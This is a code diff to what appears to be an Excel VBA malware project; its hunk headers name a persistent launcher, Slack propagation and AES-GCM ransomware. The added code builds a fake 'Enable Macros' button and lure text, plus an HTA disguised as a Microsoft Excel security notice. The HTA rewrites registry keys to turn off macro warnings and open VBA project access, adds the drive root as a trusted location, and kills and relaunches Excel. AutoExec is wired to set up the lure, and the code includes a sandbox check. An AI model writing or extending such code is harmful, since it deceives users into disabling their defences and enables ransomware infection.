@@ -217,6 +217,85 @@ Sub InstallPersistentLauncher()
 End Sub
 
 ' ========================
+' SOCIAL ENGINEERING – ENABLE MACROS BUTTON & HTA
+' ========================
+Sub CreateEnableMacrosButton()
+    On Error Resume Next
+    ' Add a button to the first worksheet that calls EnableMacrosViaHTA
+    Dim ws As Worksheet: Set ws = ThisWorkbook.Worksheets(1)
+    Dim btn As Object
+    On Error Resume Next
+    Set btn = ws.OLEObjects("EnableMacrosBtn")
+    If Not btn Is Nothing Then btn.Delete
+    Set btn = ws.OLEObjects.Add(ClassType:="Forms.CommandButton.1", Left:=100, Top:=100, Width:=150, Height:=40)
+    btn.Name = "EnableMacrosBtn"
+    btn.Object.Caption = "Enable Macros & Content"
+    btn.Object.BackColor = RGB(0, 150, 0)
+    btn.Object.ForeColor = RGB(255, 255, 255)
+    btn.Object.Font.Bold = True
+    ' Assign macro
+    btn.Object.OnAction = "EnableMacrosViaHTA"
+    ws.Shapes(btn.Name).ZOrder msoBringToFront
+    ws.Range("A1").Value = "IMPORTANT: Click the green button below to enable macros and view your document."
+    ws.Range("A1").Font.Bold = True
+    ws.Range("A1").Interior.Color = RGB(255, 255, 0)
+    ws.Range("A2").Value = "If you do not enable macros, you will not see the contents of this document."
+    ws.Range("A2").Font.Italic = True
+End Sub
+
+Public Sub EnableMacrosViaHTA()
+    ' Creates an HTA that writes registry keys to lower macro security and enable VBA project access,
+    ' then restarts Excel. This HTA runs independently and does not require macros to be already enabled.
+    On Error Resume Next
+    Dim htaPath As String: htaPath = GetTempDir() & "EnableMacros.hta"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(htaPath, True)
+    f.WriteLine "<html>"
+    f.WriteLine "<head><title>Security Warning</title>"
+    f.WriteLine "<HTA:APPLICATION ID='objEnable' APPLICATIONNAME='EnableMacros' WINDOWSTATE='normal' SHOWINTASKBAR='yes'/>"
+    f.WriteLine "<script language='VBScript'>"
+    f.WriteLine "Sub Window_OnLoad"
+    f.WriteLine "  MsgBox ""This document requires macros to be enabled. Click OK to automatically configure your security settings."", vbInformation, ""Microsoft Excel Security"""
+    f.WriteLine "End Sub"
+    f.WriteLine "Sub EnableClick()"
+    f.WriteLine "  Dim WSH: Set WSH = CreateObject(""WScript.Shell"")"
+    f.WriteLine "  On Error Resume Next"
+    f.WriteLine "  ' Lower macro security for current user"
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\15.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\14.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\14.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\12.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\12.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
+    f.WriteLine "  ' Also try HKLM if possible"
+    f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Microsoft\Office\16.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
+    f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Policies\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
+    f.WriteLine "  ' Add trusted location for this workbook"
+    f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location" & Int(Rnd * 10000) & "\Path"", Left(WSH.ExpandEnvironmentStrings(""%USERPROFILE%""), 3) & ""\"", ""REG_SZ"""
+    f.WriteLine "  MsgBox ""Security settings updated. Excel will now restart to apply changes."", vbInformation, ""Success"""
+    f.WriteLine "  WSH.Run ""taskkill /f /im excel.exe"", 0, False"
+    f.WriteLine "  ' Wait a bit then restart Excel with this workbook"
+    f.WriteLine "  WSH.Run ""excel.exe """ & gSelfPath & """", 0, False"
+    f.WriteLine "  window.close"
+    f.WriteLine "End Sub"
+    f.WriteLine "</script>"
+    f.WriteLine "<style>body{font-family:Arial;margin:20px;background:#f0f0f0}.btn{padding:10px 20px;font-size:16px;background:#4CAF50;color:white;border:none;cursor:pointer}</style>"
+    f.WriteLine "</head>"
+    f.WriteLine "<body>"
+    f.WriteLine "<h2>Microsoft Excel Security Notice</h2>"
+    f.WriteLine "<p>This document contains macros that are required to display the content correctly.</p>"
+    f.WriteLine "<p>Click the button below to automatically enable macros for this document.</p>"
+    f.WriteLine "<button class='btn' onclick='EnableClick()'>Enable Macros</button>"
+    f.WriteLine "</body></html>"
+    f.Close
+    ' Execute the HTA
+    CreateObject("WScript.Shell").Run "mshta.exe """ & htaPath & """", 1, False
+End Sub
+
+' ========================
 ' BASE64 & ENCODING – RELIABLE (DOMDocument)
 ' ========================
 Function EncodeBase64(data() As Byte) As String
@@ -1130,7 +1209,7 @@ Private Sub SlackPropagation()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM) – SAME AS BEFORE
+' RANSOMWARE (AES-GCM)
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -1592,6 +1671,10 @@ Public Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\AccessVBOM", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+        ' Also create the button and HTA launcher for social engineering
+        CreateEnableMacrosButton
+        ' Optionally launch the HTA automatically (but user might not like it)
+        ' EnableMacrosViaHTA   ' Uncomment if you want the HTA to appear automatically
     End If
     
     If IsSandbox() Then Exit Sub
